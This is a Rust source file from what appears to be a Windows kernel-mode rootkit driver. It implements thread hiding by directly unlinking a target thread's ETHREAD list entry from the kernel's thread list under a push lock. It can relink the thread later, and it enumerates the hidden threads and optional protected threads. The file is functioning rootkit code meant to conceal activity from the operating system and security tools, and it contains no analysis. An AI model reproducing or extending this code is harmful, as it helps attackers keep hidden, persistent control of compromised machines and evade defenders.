use {
    spin::mutex::Mutex,
    alloc::{boxed::Box, vec::Vec}, 
    core::sync::atomic::{AtomicPtr, Ordering},
    crate::utils::offsets::get_rundown_protect,
    spin::lazy::Lazy,
    shared::{
        structs::{HiddenThreadInfo, TargetThread, LIST_ENTRY, ThreadListInfo, EnumerateInfoInput}, 
        vars::{MAX_TIDS, Options}
    }, 
    wdk_sys::{
        ntddk::{
            ExAcquirePushLockExclusiveEx, ExReleasePushLockExclusiveEx, 
            ObfDereferenceObject, PsLookupThreadByThreadId
        }, 
        NTSTATUS, PLIST_ENTRY, STATUS_INVALID_PARAMETER, STATUS_SUCCESS,
        STATUS_UNSUCCESSFUL, _LIST_ENTRY, PETHREAD, NT_SUCCESS
    }
};

#[cfg(not(feature = "mapper"))]
pub mod callback;
#[cfg(not(feature = "mapper"))]
pub use callback::*;

/// List of target threads protected by a mutex.
pub static THREAD_INFO_HIDE: Lazy<Mutex<Vec<HiddenThreadInfo>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_TIDS))); 

/// Represents a thread in the operating system.
pub struct Thread {
    /// Pointer to the ETHREAD structure, used for managing process information.
    pub e_thread: PETHREAD,
}

impl Thread {
    /// Creates a new `Thread` instance by looking up a thread by its TID.
    ///
    /// # Parameters
    /// - `tid`: The process identifier (TID) to look up.
    ///
    /// # Returns
    /// - `Option<Self>`: Returns `Some(Self)` if the process lookup is successful, otherwise `None`.
    ///
    pub fn new(tid: usize) -> Option<Self> {
        let mut thread = core::ptr::null_mut();

        let status = unsafe { PsLookupThreadByThreadId(tid as _, &mut thread) };
        if NT_SUCCESS(status) {
            Some(Self { e_thread: thread })
        } else {
            log::error!("PsLookupThreadByThreadId Failed With Status: {status}");
            None
        }
    }

    /// Toggle the visibility of a process based on the `enable` field of the `TargetProcess` structure.
    ///
    /// # Parameters
    /// - `process`:  A pointer to the `TargetProcess` structure.
    ///
    /// # Returns
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn thread_toggle(thread: *mut TargetThread) -> NTSTATUS {
        let status = if (*thread).enable {
            Self::hide_thread(thread)
        } else {
            Self::unhide_thread(thread)
        };

        status
    }

    /// Hides a thread by removing it from the list of active threads.
    ///
    /// # Parameters
    /// - `tid`: The identifier of the target thread (TID) to be hidden.
    ///
    /// # Returns
    /// - `NTSTATUS`: A status code indicating the success or failure of the operation.
    ///
    unsafe fn hide_thread(target: *mut TargetThread) -> NTSTATUS {
        let tid = (*target).tid;
        
        // Offsets
        let rundown_protect = get_rundown_protect();
        let thread_list_entry = rundown_protect - core::mem::size_of::<usize>() as isize * 2;
        let thread_lock = rundown_protect + core::mem::size_of::<usize>() as isize;

        // Retrieving ETHREAD from the target thread
        let thread = match Self::new(tid) {
            Some(t) => t,
            None => return STATUS_UNSUCCESSFUL,
        };

        let list_entry = thread.e_thread.cast::<u8>().offset(thread_list_entry) as PLIST_ENTRY;
        let push_lock = thread.e_thread.cast::<u8>().offset(thread_lock) as *mut u64;

        ExAcquirePushLockExclusiveEx(push_lock, 0);

        let next = (*list_entry).Flink; // Thread (3)
        let previous = (*list_entry).Blink; // Thread (1)
        let list = LIST_ENTRY {
            Flink: next as *mut LIST_ENTRY,
            Blink: previous as *mut LIST_ENTRY,
        };

        let mut thread_info = THREAD_INFO_HIDE.lock();
        let list_ptr = Box::into_raw(Box::new(list));
        log::info!("Stored list entry at: {:?}", list_ptr);

        thread_info.push(HiddenThreadInfo {
            tid,
            list_entry: AtomicPtr::new(list_ptr),
        });

        (*next).Blink = previous;
        (*previous).Flink = next;

        (*list_entry).Flink = list_entry;
        (*list_entry).Blink = list_entry;

        ExReleasePushLockExclusiveEx(push_lock, 0);
        log::info!("Thread with TID {tid} hidden successfully.");

        STATUS_SUCCESS
    }

    /// Unhide a process by removing it from the list of active threads.
    ///
    /// # Parameters
    /// - `tid`: The identifier of the target process (TID) to be hidden.
    ///
    /// # Return
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    unsafe fn unhide_thread(target: *mut TargetThread) -> NTSTATUS {
        let tid = (*target).tid;

        // Offsets
        let rundown_protect = get_rundown_protect();
        let thread_list_entry = rundown_protect - core::mem::size_of::<usize>() as isize * 2;
        let thread_lock = rundown_protect + core::mem::size_of::<usize>() as isize;

        // Retrieving ETHREAD from the target thread
        let thread = match Self::new(tid) {
            Some(t) => t,
            None => return STATUS_UNSUCCESSFUL,
        };

        let list_entry = thread.e_thread.cast::<u8>().offset(thread_list_entry) as PLIST_ENTRY;
        let push_lock = thread.e_thread.cast::<u8>().offset(thread_lock) as *mut u64;

        ExAcquirePushLockExclusiveEx(push_lock, 0);
        
        // Restoring Flink / Blink
        let mut thread_info = THREAD_INFO_HIDE.lock();
        if let Some(index) = thread_info.iter().position(|p| p.tid == tid) {
            let thread = &thread_info[index];
            let list = thread.list_entry.load(Ordering::SeqCst);
            if list.is_null() {
                log::error!("List entry stored in AtomicPtr is null");
                return STATUS_INVALID_PARAMETER;
            }

            (*list_entry).Flink = (*list).Flink as *mut _LIST_ENTRY;
            (*list_entry).Blink = (*list).Blink as *mut _LIST_ENTRY;

            let next = (*list_entry).Flink; // Thread (3)
            let previous = (*list_entry).Blink; // Thread (1)

            (*next).Blink = list_entry;
            (*previous).Flink = list_entry;

            thread_info.remove(index);
        } else {
            log::info!("TID ({tid}) Not found");
            ExReleasePushLockExclusiveEx(push_lock, 0);
            return STATUS_UNSUCCESSFUL;
        }

        log::info!("Thread with TID {tid} unhidden successfully.");
        ExReleasePushLockExclusiveEx(push_lock, 0);

        STATUS_SUCCESS
    }

    /// Enumerates and hides threads by populating the provided `ThreadListInfo` structure with thread IDs.
    ///
    /// # Parameters
    /// - `info_process`: A pointer to the `ThreadListInfo` structure to be populated.
    /// - `information`: A mutable reference to a `usize` value that will be updated with the size of the populated data.
    ///
    /// # Returns
    /// - `NTSTATUS`: A status code indicating the success or failure of the operation.
    ///
    pub unsafe fn enumerate_hide_threads(info_process: *mut ThreadListInfo, information: &mut usize) -> NTSTATUS {
        let thread_info = THREAD_INFO_HIDE.lock();
        let mut count = 0;
        for i in thread_info.iter() {
            (*info_process.offset(count)).tids = i.tid;

            *information += core::mem::size_of::<ThreadListInfo>();
            count += 1;
        }

        STATUS_SUCCESS
    }

    /// Enumerates threads and performs actions based on the specified options (hide or protection).
    ///
    /// # Parameters
    /// - `input_target`: A pointer to the `EnumerateInfoInput` structure containing the target options.
    /// - `info_process`: A pointer to the `ThreadListInfo` structure to be populated.
    /// - `information`: A mutable reference to a `usize` value that will be updated with the size of the populated data.
    ///
    /// # Returns
    /// - `NTSTATUS`: A status code indicating the success or failure of the operation.
    ///
    pub unsafe fn enumerate_thread_toggle(input_target: *mut EnumerateInfoInput, info_process: *mut ThreadListInfo, information: &mut usize) -> NTSTATUS {
        let status;
        
        match (*input_target).options {
            Options::Hide => {
                status = Self::enumerate_hide_threads(info_process, information);
            },
            #[cfg(not(feature = "mapper"))]
            Options::Protection => {
                status = enumerate_protection_threads(info_process, information);
            },
            #[cfg(feature = "mapper")]
            Options::Protection => {
                status = wdk_sys::STATUS_INVALID_DEVICE_REQUEST;
            },
        }

        status
    }

}

/// Implements the `Drop` trait for the `Thread` structure to handle cleanup when the structure goes out of scope.
impl Drop for Thread {
    /// Cleans up the resources held by the `Process` structure.
    fn drop(&mut self) {
        if !self.e_thread.is_null() {
            unsafe { ObfDereferenceObject(self.e_thread as _) };
        }
    }
}
